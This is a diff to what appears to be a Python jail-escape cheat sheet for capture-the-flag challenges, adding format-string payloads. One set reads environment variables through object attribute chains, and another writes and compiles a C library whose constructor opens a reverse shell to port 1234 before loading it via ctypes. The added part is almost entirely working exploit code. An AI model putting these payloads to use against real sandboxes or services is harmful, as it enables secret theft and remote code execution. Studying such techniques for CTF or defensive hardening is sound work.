@@ -248,6 +248,24 @@ __builtins__.__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat", 
 
 ```
 
+### Leak data using format strings
+```py
+"{0.__self__.help.__call__.__globals__[sys].modules[os].environ}".format(print)
+"{a.__self__.help.__call__.__globals__[sys].modules[os].environ}".format_map({"a":print})
+"{0.gi_frame.f_builtins[help].__call__.__globals__[sys].modules[os].environ}".format((x for x in ()))
+```
+
+### RCE with format strings
+```py
+# Requirements: file upload/arb write and ctypes loaded
+
+open("/tmp/lib.c", "wb").write(b"""#include <stdlib.h>\n__attribute__((constructor))\nvoid init() {\nsystem("python3 -c \\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system('/bin/sh')\\"");\n}""")
+os.system("gcc -shared -fPIC /tmp/lib.c -o lib.so")
+
+print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}".format(user))
+
+```
+
 ### OOB Read using LOAD_FAST
 ```py
 # Thanks to @splitline, https://blog.splitline.tw/hitcon-ctf-2022/#v-o-i-d-misc
@@ -365,6 +383,10 @@ code = bytes([
 
 print(code.hex())
 ```
+
+# Credits
+ - https://shirajuki.js.org/blog/pyjail-cheatsheet
+ - https://jbnrz.com.cn/index.php/2024/05/19/pyjail/
 
 ### Other useful things
 ```py
